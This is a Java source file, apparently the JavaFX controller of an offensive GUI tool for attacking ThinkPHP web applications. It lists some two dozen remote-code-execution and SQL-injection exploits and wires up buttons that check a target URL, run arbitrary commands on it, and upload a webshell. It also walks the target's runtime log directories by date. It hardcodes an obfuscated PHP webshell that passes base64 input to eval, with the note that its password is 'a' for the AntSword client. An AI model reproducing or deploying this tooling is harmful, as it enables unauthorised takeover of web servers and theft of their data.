package fun.fireline.controller;

import com.jfoenix.controls.JFXButton;
import com.jfoenix.controls.JFXComboBox;
import fun.fireline.core.*;
import fun.fireline.tools.Tools;
import javafx.fxml.FXML;
import javafx.scene.control.*;

import java.time.LocalDate;
import java.time.chrono.ChronoLocalDate;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;


/**
 * @author yhy
 * @date 2021/7/3 13:15
 * @github https://github.com/yhy0
 * thinkphp 利用逻辑
 */

// JavaFX图形化界面的控制类
public class ThinkPHPController extends MainController{
    @FXML
    private ChoiceBox<String> choice_cve;
    @FXML
    private ChoiceBox<String> encoding;
    @FXML
    private ChoiceBox<String> platform;
    @FXML
    private TextArea basic_info;
    @FXML
    private TextArea cmd_info;
    @FXML
    private TextField cmd;
    @FXML
    private TextArea upload_info;
    @FXML
    private TextField upload_path;
    @FXML
    private TextArea upload_msg;
    @FXML
    private TextField url;
    @FXML
    private JFXComboBox<String> logPath;

    @FXML
    private JFXButton log_clear;

    @FXML
    private DatePicker start_time;
    @FXML
    private DatePicker stop_time;

    @FXML
    private TextArea loginfo;

    private ExploitInterface ei;

    public static String BASICINFO = Constants.SECURITYSTATEMENT +

            "支持检测: \r\n" +
            "\tThinkPHP 2.x : \tThinkPHP 2.x 任意代码执行漏洞   https://vulhub.org/#/environments/thinkphp/2-rce/ \r\n" +
            "\tTP5_construct_code_exec_1 \t TP5_construct_code_exec_2 \t TP5_construct_code_exec_3 \t TP5_construct_code_exec_4 \r\n" +
            "\tTP5_construct_debug_rce \t TP5_driver_display_rce \t TP5_invoke_func_code_exec_1 \t TP5_invoke_func_code_exec_2 \r\n" +
            "\tTP5_method_filter_code_exec \tTP5_request_input_rce \tTP5_templalte_driver_rce \tTP6_session_file_write \r\n" +
            "\tTP_cache \tTP5_index_showid_rce \tTP5_debug_index_ids_sqli \tTP_checkcode_time_sqli \r\n" +
            "\tTP_multi_sql_leak \tTP_pay_orderid_sqli \tTP_update_sql tTP_view_recent_xff_sqli \r\n" +

            "\r\n\t\t\tpayload均取自 https://github.com/bewhale/thinkphp_gui_tools\r\n" +
            "\t\t\thttp 请求包也是取自蓝鲸师傅，特此感谢！\r\n" +
            "\t\t\t蓝鲸师傅 yyds \r\n\r\n\r\n" +

            Constants.UPDATEINFO;

    public static String[] ThinkPHP = {
            "all",
            "ThinkPHP 2.x",
            "TP5_construct_code_exec_1",
            "TP5_construct_code_exec_2",
            "TP5_construct_code_exec_3",
            "TP5_construct_code_exec_4",
            "TP5_construct_debug_rce",
            "TP5_driver_display_rce",
            "TP5_index_construct_rce",
            "TP5_invoke_func_code_exec_1",
            "TP5_invoke_func_code_exec_2",
            "TP5_method_filter_code_exec",
            "TP5_request_input_rce",
            "TP5_templalte_driver_rce",
            "TP6_session_file_write",
            "TP_cache",
            "TP5_index_showid_rce",
            "TP5_debug_index_ids_sqli",
            "TP_checkcode_time_sqli",
            "TP_multi_sql_leak",
            "TP_pay_orderid_sqli",
            "TP_update_sql",
            "TP_view_recent_xff_sqli",
    };

    public static String SHELL = "<?php $a=\"~+d()\"^\"!{+{}\";@$b=base64_decode(${$a}[\"a\"]);eval(\"\".$b);?>";

    // 界面显示  一些默认的基本信息，漏洞列表、编码选项、线程、shell、页脚
    public void defaultInformation() {
        this.choice_cve.setValue(ThinkPHP[0]);
        for (String cve : ThinkPHP) {
            this.choice_cve.getItems().add(cve);
        }
        this.encoding.setValue(Constants.ENCODING[0]);

        for (String coding : Constants.ENCODING) {
            this.encoding.getItems().add(coding);
        }

        // 默认的shell
        this.upload_info.setText(SHELL);
        this.upload_info.setWrapText(true);

        // 命令执行
        this.cmd_info.setText(" ");
        this.cmd_info.setWrapText(true);

        this.upload_msg.setText("[+] 如需要自定义写入shell的路径，文件名处填写绝对路径即可(少数exp不支持)。\r\n" +
                "[+] 默认shell使用蚁剑连接，密码为a，需要base64编码器。");


        this.platform.setValue("Linux");
        this.platform.getItems().add("Linux");
        this.platform.getItems().add("Windows");

    }

    // 基本信息
    public void basic() {
        this.logPath.getItems().addAll("/runtime/log/",
                "/Runtime/Logs/",
                "/Runtime/Logs/Home/",
                "/Runtime/Logs/Admin/",
                "/App/Runtime/Logs/",
                "/Application/Runtime/Logs/",
                "/Application/Runtime/Logs/Home/",
                "/Application/Runtime/Logs/Common/",
                "/Application/Runtime/Logs/Admin/");

        this.logPath.setValue("/runtime/log/");

        this.logPath.setEditable(true);

        // 切换界面保留原来的记录
        // 基本信息的历史记录
        if(history.containsKey("ThinkPHP_url")) {
            this.url.setText((String) history.get("ThinkPHP_url"));
        }
        if(history.containsKey("ThinkPHP_vulName")) {
            this.choice_cve.setValue((String) history.get("ThinkPHP_vulName"));
        }
        if(history.containsKey("ThinkPHP_ei")) {
            this.ei = (ExploitInterface) history.get("ThinkPHP_ei");
        }
        if(history.containsKey("ThinkPHP_basic_info")) {
            this.basic_info.setText((String) history.get("ThinkPHP_basic_info"));
        } else {
            this.basic_info.setText(BASICINFO);
        }
        this.basic_info.setWrapText(true);

        // 命令执行的历史记录
        if(history.containsKey("ThinkPHP_cmd")) {
            this.cmd.setText((String) history.get("ThinkPHP_cmd"));
        }
        if(history.containsKey("ThinkPHP_encoding")) {
            this.encoding.setValue((String) history.get("ThinkPHP_encoding"));
        }
        if(history.containsKey("ThinkPHP_cmd_info")) {
            this.cmd_info.setText((String) history.get("ThinkPHP_cmd_info"));
        }

        // 文件上传的历史记录
        if(history.containsKey("ThinkPHP_upload_info")) {
            this.upload_info.setText((String) history.get("ThinkPHP_upload_info"));
        }
        if(history.containsKey("ThinkPHP_upload_path")) {
            this.upload_path.setText((String) history.get("ThinkPHP_upload_path"));
        }
        if(history.containsKey("ThinkPHP_platform")) {
            this.platform.setValue((String) history.get("ThinkPHP_platform"));
        }
        if(history.containsKey("ThinkPHP_upload_msg")) {
            this.upload_msg.setText((String) history.get("ThinkPHP_upload_msg"));
        }
    }

    // 点击检测，获取url 和 要检测的漏洞
    @FXML
    public void check() {
        String url = Tools.urlParse(this.url.getText().trim());
        history.put("ThinkPHP_url", this.url.getText());
        String vulName = this.choice_cve.getValue().toString().trim();

        history.put("ThinkPHP_vulName", this.choice_cve.getValue());

        try {
            if (vulName.equals("all")) {
                this.basic_info.setText("[+] " + url + " 的检测结果如下：\n");
                for (String vul : this.choice_cve.getItems()) {
                    if (!vul.equals("all")) {
                        VulCheckTask vulCheckTask = new VulCheckTask(this.url.getText(), vul);
                        vulCheckTask.messageProperty().addListener((observable, oldValue, newValue) -> {
                            this.basic_info.appendText("\t" + newValue + "\r\n\r\n");
                            if(newValue.contains("目标存在")) {
                                this.choice_cve.setValue(vul);
                                this.ei = Tools.getExploit(vul);
                                this.ei.checkVul(url);
                            }
                        });
                        (new Thread(vulCheckTask)).start();
                    }
                }
            } else {
                this.ei = Tools.getExploit(vulName);
                String result = this.ei.checkVul(url);
                this.basic_info.setText("\r\n\t" + result + "\r\n\r\n\twebPath:\r\n\t\t" + this.ei.getWebPath());
            }

        } catch (Exception e) {
            this.basic_info.setText("\r\n\t检测异常 \r\n\t\t\t" + e.toString());
        }

        history.put("ThinkPHP_ei", this.ei);
        history.put("ThinkPHP_basic_info", this.basic_info.getText());

        history.put("ThinkPHP_basic_info1", this.basic_info.getText());

    }

    // 命令执行
    @FXML
    public void get_execute_cmd() {
        String cmd = this.cmd.getText();
        String encoding = this.encoding.getValue().toString().trim();

        history.put("ThinkPHP_cmd", this.cmd.getText());
        history.put("ThinkPHP_encoding", this.encoding.getValue());

        if(cmd.length() == 0) {
            cmd = "whoami";
        }

        try {
            if(this.ei.isVul()) {
                String result = this.ei.exeCmd(cmd, encoding);
                this.cmd_info.setText(result);

            } else {
                this.cmd_info.setText("请先进行漏洞检测，确认漏洞存在");
            }

        } catch (Exception var4) {
            this.cmd_info.setText("请先进行漏洞检测，确认漏洞存在\r\n");
            this.cmd_info.appendText("error: " + var4.toString());
        }
        history.put("ThinkPHP_cmd_info", this.cmd_info.getText());
    }


    // 点击上传文件，获取上传的文件信息
    @FXML
    public void get_shell_file() {
        String shell_info = this.upload_info.getText();
        String upload_path = this.upload_path.getText();
        String platform = this.platform.getValue().toString().trim();

        history.put("ThinkPHP_upload_info", this.upload_info.getText());
        history.put("ThinkPHP_upload_path", this.upload_path.getText());
        history.put("ThinkPHP_platform", this.platform.getValue());

        if(upload_path.length() == 0) {
            upload_path = "test.php";
        }

        if(shell_info.length() > 0) {
            if(this.ei.isVul()) {
                try {
                    String result = this.ei.uploadFile(shell_info, upload_path, platform);

                    this.upload_msg.setText(result);
                } catch (Exception var4) {
                    this.upload_msg.setText(var4.toString());
                }

            } else {
                this.upload_msg.setText("文件上传失败！");
            }
            history.put("ThinkPHP_upload_msg", this.upload_msg.getText());
        } else {
            Tools.alert("文件上传", "上传的文件不能为空");
        }

    }

    // 日志遍历
    @FXML
    public void log_traversal_start() {
        this.logPath.getValue();
        if (this.start_time.getValue() != null && this.stop_time.getValue() != null && this.logPath.getValue() != null && !((String)this.logPath.getValue()).equals("")) {
            this.loginfo.appendText("开始遍历日志：\n");

            for(LocalDate currentdate = (LocalDate)this.start_time.getValue(); currentdate.isBefore((ChronoLocalDate)this.stop_time.getValue()) || currentdate.equals(this.stop_time.getValue()); currentdate = currentdate.plusDays(1L)) {
                WebLogTask webLogTask = new WebLogTask(Tools.urlParse(this.url.getText()), (String)this.logPath.getValue(), String.valueOf(currentdate.getYear()), String.valueOf(currentdate.getMonth().getValue()), String.valueOf(currentdate.getDayOfMonth()));
                webLogTask.messageProperty().addListener((observable, oldValue, newValue) -> {
                    this.loginfo.appendText(newValue + "\n");
                });
                (new Thread(webLogTask)).start();
            }
        } else {
            Tools.alert("提示", "请输入路径和需要遍历的日期区间！");
        }
    }


    // 加载
    public void initialize() {
        this.log_clear.setOnAction((event) ->{
            this.loginfo.setText("");
        });
        try {
            this.defaultInformation();
            this.basic();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
